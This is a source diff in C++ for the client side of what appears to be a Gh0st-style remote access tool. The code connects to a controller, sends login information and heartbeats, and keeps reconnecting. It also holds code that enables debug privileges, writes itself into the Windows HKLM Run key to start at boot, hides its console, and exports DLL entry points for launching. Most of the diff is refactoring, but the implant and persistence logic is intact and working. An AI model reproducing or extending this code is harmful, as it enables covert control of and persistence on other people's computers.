@@ -2,18 +2,7 @@
 //
 
 #include "stdafx.h"
-#include "Common.h"
-#include "IOCPClient.h"
-#include <IOSTREAM>
-#include "LoginServer.h"
-#include "KernelManager.h"
-#include <iosfwd>
-#include <vector>
-#include <iostream>
-#include <fstream>
-#include <sstream>
-#include <shellapi.h>
-#include <corecrt_io.h>
+#include "ClientDll.h"
 
 // 自动启动注册表中的值
 #define REG_NAME "a_ghost"
@@ -21,115 +10,49 @@
 // 启动的客户端个数
 #define CLIENT_PARALLEL_NUM 1
 
-// 客户端类：将全局变量打包到一起.
-// 最终客户端只有2个全局变量: g_SETTINGS、g_MyApp，而g_SETTINGS作为g_MyApp的成员.
-// 因此全局来看只有一个全局变量: g_MyApp
-typedef struct ClientApp
-{
-	BOOL			g_bExit;			// 应用程序状态（1-被控端退出 2-主控端退出 3-其他条件）
-	BOOL			g_bThreadExit;		// 工作线程状态
-	HINSTANCE		g_hInstance;		// 进程句柄
-	CONNECT_ADDRESS *g_Connection;		// 连接信息
-	HANDLE			g_hEvent;			// 全局事件
-}ClientApp;
-
 // 远程地址
 CONNECT_ADDRESS g_SETTINGS = {FLAG_GHOST, "127.0.0.1", "6543", CLIENT_TYPE_DLL};
 
-// 应用程序
-ClientApp g_MyApp = { FALSE, FALSE, NULL, &g_SETTINGS, NULL };
+// 最终客户端只有2个全局变量: g_SETTINGS、g_MyApp，而g_SETTINGS作为g_MyApp的成员.
+// 因此全局来看只有一个全局变量: g_MyApp
+ClientApp g_MyApp(&g_SETTINGS, IsClientAppRunning);
 
-// 启动核心线程，参数为：ClientApp
-DWORD WINAPI StartClient(LPVOID lParam);
+enum { E_RUN, E_STOP, E_EXIT } status;
 
-#if _CONSOLE
+int ClientApp::m_nCount = 0;
 
-enum { E_RUN, E_STOP } status;
+CLock ClientApp::m_Locker;
 
-//提升权限
-void DebugPrivilege()
-{
-	HANDLE hToken = NULL;
-	//打开当前进程的访问令牌
-	int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
-
-	if (hRet)
-	{
-		TOKEN_PRIVILEGES tp;
-		tp.PrivilegeCount = 1;
-		//取得描述权限的LUID
-		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-		//调整访问令牌的权限
-		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
-
-		CloseHandle(hToken);
-	}
+BOOL IsProcessExit() {
+	return g_MyApp.g_bExit == S_CLIENT_EXIT;
 }
 
-/**
-* @brief 设置本身开机自启动
-* @param[in] *sPath 注册表的路径
-* @param[in] *sNmae 注册表项名称
-* @return 返回注册结果
-* @details Win7 64位机器上测试结果表明，注册项在：\n
-* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
-* @note 首次运行需要以管理员权限运行，才能向注册表写入开机启动项
-*/
-BOOL SetSelfStart(const char* sPath, const char* sNmae)
-{
-	DebugPrivilege();
-
-	// 写入的注册表路径
-#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
-
-	// 在注册表中写入启动信息
-	HKEY hKey = NULL;
-	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
-
-	// 判断是否成功
-	if (lRet != ERROR_SUCCESS)
-		return FALSE;
-
-	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);
-
-	// 关闭注册表
-	RegCloseKey(hKey);
-
-	// 判断是否成功
-	return lRet == ERROR_SUCCESS;
+BOOL IsSharedRunning(void* thisApp) {
+	ClientApp* This = (ClientApp*)thisApp;
+	return (S_CLIENT_NORMAL == g_MyApp.g_bExit) && (S_CLIENT_NORMAL == This->g_bExit);
 }
 
-// 隐藏控制台
-// 参看：https://blog.csdn.net/lijia11080117/article/details/44916647
-// step1: 在链接器"高级"设置入口点为mainCRTStartup
-// step2: 在链接器"系统"设置系统为窗口
-// 完成
-
-BOOL CALLBACK callback(DWORD CtrlType)
-{
-	if (CtrlType == CTRL_CLOSE_EVENT)
-	{
-		g_MyApp.g_bExit = true;
-		while (E_RUN == status)
-			Sleep(20);
-	}
-	return TRUE;
+BOOL IsClientAppRunning(void* thisApp) {
+	ClientApp* This = (ClientApp*)thisApp;
+	return S_CLIENT_NORMAL == This->g_bExit;
 }
 
-// 线程`StartClientApp`的启动参数.
-typedef struct ClientStartArg 
-{
-	int				ID;			// 线程返回代码
-	ClientApp		App;		// 客户端对象
-	const char*		IP;			// 远程IP
-	int				Port;		// 远程端口
-}ClientStartArg;
+ClientApp* NewClientStartArg(const char* remoteAddr, IsRunning run, BOOL shared) {
+	auto v = StringToVector(remoteAddr, ':', 2);
+	if (v[0].empty() || v[1].empty())
+		return nullptr;
+	auto a = new ClientApp(g_MyApp.g_Connection, run, shared);
+	a->g_Connection->SetServer(v[0].c_str(), atoi(v[1].c_str()));
+	return a;
+}
 
-
-DWORD StartClientApp(int id, ClientApp &app, const char *ip, int port) {
-	CONNECT_ADDRESS& settings(*(app.g_Connection));
-	BOOL& bExit(app.g_bExit);
+DWORD WINAPI StartClientApp(LPVOID param) {
+	ClientApp::AddCount(1);
+	ClientApp* app = (ClientApp*)param;
+	CONNECT_ADDRESS& settings(*(app->g_Connection));
+	const char* ip = settings.ServerIP();
+	int port = settings.ServerPort();
+	State& bExit(app->g_bExit);
 	if (ip != NULL && port > 0)
 	{
 		settings.SetServer(ip, port);
@@ -137,30 +60,27 @@ DWORD StartClientApp(int id, ClientApp &app, const char *ip, int port) {
 	if (strlen(settings.ServerIP()) == 0 || settings.ServerPort() <= 0) {
 		Mprintf("参数不足: 请提供远程主机IP和端口!\n");
 		Sleep(3000);
-		return -1;
+	} else {
+		app->g_hInstance = GetModuleHandle(NULL);
+		Mprintf("[ClientApp: %d] Total [%d] %s:%d \n", app->m_ID, app->GetCount(), settings.ServerIP(), settings.ServerPort());
+
+		do {
+			bExit = S_CLIENT_NORMAL;
+			HANDLE hThread = CreateThread(NULL, 0, StartClient, app, 0, NULL);
+
+			WaitForSingleObject(hThread, INFINITE);
+			CloseHandle(hThread);
+			if (IsProcessExit()) // process exit
+				break;
+		} while (E_RUN == status && S_CLIENT_EXIT != bExit);
 	}
-	app.g_hInstance = GetModuleHandle(NULL);
-	Mprintf("[server: %d] %s:%d HINSTANCE: %p\n", id, settings.ServerIP(), settings.ServerPort(), app.g_hInstance);
 
-	do {
-		bExit = 0;
-		HANDLE hThread = CreateThread(NULL, 0, StartClient, &app, 0, NULL);
+	auto r = app->m_ID;
+	if (app != &g_MyApp) delete app;
+	ClientApp::AddCount(-1);
 
-		WaitForSingleObject(hThread, INFINITE);
-		CloseHandle(hThread);
-	} while (E_RUN == status && 1 != bExit);
-
-	return id;
-}
-
-
-DWORD WINAPI StartClientApp(LPVOID param) {
-	ClientStartArg* a = (ClientStartArg*)param;
-	auto r = StartClientApp(a->ID, a->App, a->IP, a->Port);
-	SAFE_DELETE(a);
 	return r;
 }
-
 
 /**
  * @brief 等待多个句柄（支持超过MAXIMUM_WAIT_OBJECTS限制）
@@ -229,6 +149,79 @@ DWORD WaitForMultipleHandlesEx(
 	}
 }
 
+#if _CONSOLE
+
+//提升权限
+void DebugPrivilege()
+{
+	HANDLE hToken = NULL;
+	//打开当前进程的访问令牌
+	int hRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
+
+	if (hRet)
+	{
+		TOKEN_PRIVILEGES tp;
+		tp.PrivilegeCount = 1;
+		//取得描述权限的LUID
+		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+		//调整访问令牌的权限
+		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+
+		CloseHandle(hToken);
+	}
+}
+
+/**
+* @brief 设置本身开机自启动
+* @param[in] *sPath 注册表的路径
+* @param[in] *sNmae 注册表项名称
+* @return 返回注册结果
+* @details Win7 64位机器上测试结果表明，注册项在：\n
+* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+* @note 首次运行需要以管理员权限运行，才能向注册表写入开机启动项
+*/
+BOOL SetSelfStart(const char* sPath, const char* sNmae)
+{
+	DebugPrivilege();
+
+	// 写入的注册表路径
+#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
+
+	// 在注册表中写入启动信息
+	HKEY hKey = NULL;
+	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);
+
+	// 判断是否成功
+	if (lRet != ERROR_SUCCESS)
+		return FALSE;
+
+	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);
+
+	// 关闭注册表
+	RegCloseKey(hKey);
+
+	// 判断是否成功
+	return lRet == ERROR_SUCCESS;
+}
+
+// 隐藏控制台
+// 参看：https://blog.csdn.net/lijia11080117/article/details/44916647
+// step1: 在链接器"高级"设置入口点为mainCRTStartup
+// step2: 在链接器"系统"设置系统为窗口
+// 完成
+
+BOOL CALLBACK callback(DWORD CtrlType)
+{
+	if (CtrlType == CTRL_CLOSE_EVENT)
+	{
+		g_MyApp.g_bExit = S_CLIENT_EXIT;
+		while (E_RUN == status)
+			Sleep(20);
+	}
+	return TRUE;
+}
+
 int main(int argc, const char *argv[])
 {
 	if (!SetSelfStart(argv[0], REG_NAME))
@@ -248,14 +241,17 @@ int main(int argc, const char *argv[])
 	SetConsoleCtrlHandler(&callback, TRUE);
 	const char* ip = argc > 1 ? argv[1] : NULL;
 	int port = argc > 2 ? atoi(argv[2]) : 0;
-	g_MyApp.g_Connection->SetType(CLIENT_TYPE_ONE);
+	ClientApp& app(g_MyApp);
+	app.g_Connection->SetType(CLIENT_TYPE_ONE);
+	app.g_Connection->SetServer(ip, port);
 	if (CLIENT_PARALLEL_NUM == 1) {
 		// 启动单个客户端
-		StartClientApp(0, g_MyApp, ip, port);
+		StartClientApp(&app);
 	} else {
 		std::vector<HANDLE> handles(CLIENT_PARALLEL_NUM);
 		for (int i = 0; i < CLIENT_PARALLEL_NUM; i++) {
-			handles[i] = CreateThread(0, 64*1024, StartClientApp, new ClientStartArg{ i, g_MyApp, ip, port }, 0, 0);
+			auto client = new ClientApp(app.g_Connection, IsSharedRunning, FALSE);
+			handles[i] = CreateThread(0, 64*1024, StartClientApp, client->SetID(i), 0, 0);
 			if (handles[i] == 0) {
 				Mprintf("线程 %d 创建失败，错误: %d\n", i, errno);
 			}
@@ -265,7 +261,7 @@ int main(int argc, const char *argv[])
 			Mprintf("WaitForMultipleObjects 失败，错误代码: %d\n", GetLastError());
 		}
 	}
-
+	ClientApp::Wait();
 	status = E_STOP;
 
 	CloseHandle(hMutex);
@@ -298,7 +294,7 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
 	ClientApp& app(g_MyApp);
 	CONNECT_ADDRESS& settings(*(app.g_Connection));
-	app.g_bExit = FALSE;
+	app.g_bExit = S_CLIENT_NORMAL;
 	if (strlen(szServerIP)>0 && uPort>0)
 	{
 		settings.SetServer(szServerIP, uPort);
@@ -317,7 +313,7 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 }
 
 // 停止运行
-extern "C" __declspec(dllexport) void StopRun() { g_MyApp.g_bExit = true; }
+extern "C" __declspec(dllexport) void StopRun() { g_MyApp.g_bExit = S_CLIENT_EXIT; }
 
 // 是否成功停止
 extern "C" __declspec(dllexport) bool IsStoped() { return g_MyApp.g_bThreadExit; }
@@ -334,11 +330,11 @@ extern "C" __declspec(dllexport) int EasyRun() {
 		TestRun((char*)settings.ServerIP(), settings.ServerPort());
 		while (!IsStoped())
 			Sleep(50);
-		if (1 == app.g_bExit) // 受控端退出
+		if (S_CLIENT_EXIT == app.g_bExit) // 受控端退出
 			break;
-		else if (2 == app.g_bExit)
+		else if (S_SERVER_EXIT == app.g_bExit)
 			continue;
-		else // 3: 程序更新
+		else // S_CLIENT_UPDATE: 程序更新
 			break;
 	} while (true);
 
@@ -405,7 +401,7 @@ int nCmdShow: 窗口显示状态。
 extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
 	ClientApp& app(g_MyApp);
 	CONNECT_ADDRESS& settings(*(app.g_Connection));
-	BOOL& bExit(app.g_bExit);
+	State& bExit(app.g_bExit);
 	char message[256] = { 0 };
 	if (strlen(lpszCmdLine) != 0) {
 		strcpy_s(message, lpszCmdLine);
@@ -433,11 +429,11 @@ extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpsz
 		TestRun((char*)result[0].c_str(), atoi(result[1].c_str()));
 		while (!IsStoped())
 			Sleep(20);
-		if (bExit == 1)
+		if (bExit == S_CLIENT_EXIT)
 			return;
-		else if (bExit == 2)
+		else if (bExit == S_SERVER_EXIT)
 			continue;
-		else // 3
+		else // S_CLIENT_UPDATE
 			break;
 	} while (true);
 
@@ -451,39 +447,42 @@ DWORD WINAPI StartClient(LPVOID lParam)
 {
 	ClientApp& app(*(ClientApp*)lParam);
 	CONNECT_ADDRESS& settings(*(app.g_Connection));
-	BOOL& bExit(app.g_bExit);
+	State& bExit(app.g_bExit);
 	IOCPClient  *ClientObject = new IOCPClient(bExit);
+	CKernelManager* Manager = nullptr;
 
-	if (NULL == app.g_hEvent)
-		app.g_hEvent = CreateEventA(NULL, TRUE, FALSE, EVENT_FINISHED);
-	if (app.g_hEvent == NULL) {
-		Mprintf("[StartClient] Failed to create event: %s! %d.\n", EVENT_FINISHED, GetLastError());
+	if (!app.m_bShared) {
+		if (NULL == app.g_hEvent) {
+			app.g_hEvent = CreateEventA(NULL, TRUE, FALSE, EVENT_FINISHED);
+		}
+		if (app.g_hEvent == NULL) {
+			Mprintf("[StartClient] Failed to create event: %s! %d.\n", EVENT_FINISHED, GetLastError());
+		}
 	}
 
 	app.g_bThreadExit = false;
-	while (!bExit)
+	while (app.m_bIsRunning(&app))
 	{
 		ULONGLONG dwTickCount = GetTickCount64();
 		if (!ClientObject->ConnectServer(settings.ServerIP(), settings.ServerPort()))
 		{
-			for (int k = 500; !bExit && --k; Sleep(10));
+			for (int k = 500; app.m_bIsRunning(&app) && --k; Sleep(10));
 			continue;
 		}
 		//准备第一波数据
 		LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings.ClientType());
 		ClientObject->SendLoginInfo(login);
 
-		CKernelManager	*Manager = new CKernelManager(&settings, ClientObject, app.g_hInstance);
+		SAFE_DELETE(Manager);
+		Manager = new CKernelManager(&settings, ClientObject, app.g_hInstance);
 		do 
 		{
 			Manager->SendHeartbeat();
-		} while (ClientObject->IsRunning() && ClientObject->IsConnected() && !bExit);
-		while (GetTickCount64() - dwTickCount < 5000 && !bExit)
+		} while (ClientObject->IsRunning() && ClientObject->IsConnected() && app.m_bIsRunning(&app));
+		while (GetTickCount64() - dwTickCount < 5000 && app.m_bIsRunning(&app))
 			Sleep(200);
-
-		delete Manager;
 	}
-	if (app.g_bExit == 1 && app.g_hEvent) {
+	if (app.g_bExit == S_CLIENT_EXIT && app.g_hEvent && !app.m_bShared) {
 		BOOL b = SetEvent(app.g_hEvent);
 		Mprintf(">>> [StartClient] Set event: %s %s!\n", EVENT_FINISHED, b ? "succeed" : "failed");
 
@@ -493,6 +492,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 
 	Mprintf("StartClient end\n");
 	delete ClientObject;
+	SAFE_DELETE(Manager);
 	app.g_bThreadExit = true;
 
 	return 0;
